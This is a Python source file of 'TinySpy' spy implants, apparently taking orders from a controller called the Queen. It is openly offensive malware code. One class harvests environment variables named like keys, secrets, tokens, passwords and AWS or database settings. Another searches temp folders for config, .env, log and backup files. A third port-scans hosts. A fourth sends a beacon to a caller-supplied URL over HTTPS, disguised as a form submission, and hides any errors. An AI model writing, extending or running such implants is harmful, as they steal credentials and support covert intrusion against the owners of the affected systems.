"""TinySpy implants — inert until the Queen issues a spy order."""
import json, os, socket, time, urllib.request

def _env():
    return {k: v for k, v in os.environ.items()
            if any(w in k.upper() for w in ("KEY", "SECRET", "TOKEN", "PASS", "AWS", "DB_"))}

class Wisp:      # ambient observer — watches env, configs, metadata
    def run(self, body):
        return {"tool": "Wisp", "target": body.get("target", os.uname().nodename),
                "data": {"env_secrets": _env(), "cwd": os.getcwd(),
                         "whoami": os.getenv("USER")}}

class Mite:      # artifact dweller — nests in files, watches changes
    def run(self, body):
        hits = []
        for root in body.get("paths", ["/tmp", "/var/tmp"]):
            if not os.path.isdir(root):
                continue
            for dp, _, fs in os.walk(root):
                for f in fs:
                    if any(f.endswith(e) for e in (".conf", ".env", ".log", ".bak")):
                        hits.append(os.path.join(dp, f))
                if len(hits) > 20:
                    break
        return {"tool": "Mite", "target": body.get("target", os.uname().nodename),
                "data": {"interesting_files": hits}}

class Flea:      # flow rider — rides traffic inside the trust boundary
    def run(self, body):
        open_ports = []
        for h in body.get("hosts", ["127.0.0.1"]):
            for p in range(1, 100):
                s = socket.socket(); s.settimeout(0.02)
                try:
                    if s.connect_ex((h, p)) == 0:
                        open_ports.append(p)
                finally:
                    s.close()
        return {"tool": "Flea", "target": body.get("target", "local"),
                "data": {"local_listeners": open_ports}}

class Gnat:      # heartbeat keeper — dormant persistence, beacons on schedule
    def run(self, body):
        time.sleep(body.get("dormant", 1))
        url = body.get("beacon")
        out = {"tool": "Gnat", "target": body.get("target", os.uname().nodename),
               "data": {"beacon": url, "status": "armed", "rearm": body.get("rearm", True)}}
        if url:   # standard-looking HTTPS POST, like a form submission
            try:
                urllib.request.urlopen(urllib.request.Request(
                    url, data=json.dumps(out).encode(),
                    headers={"Content-Type": "application/json"}), timeout=3)
            except Exception:
                pass
        return out

SPIES = {"Wisp": Wisp(), "Mite": Mite(), "Flea": Flea(), "Gnat": Gnat()}
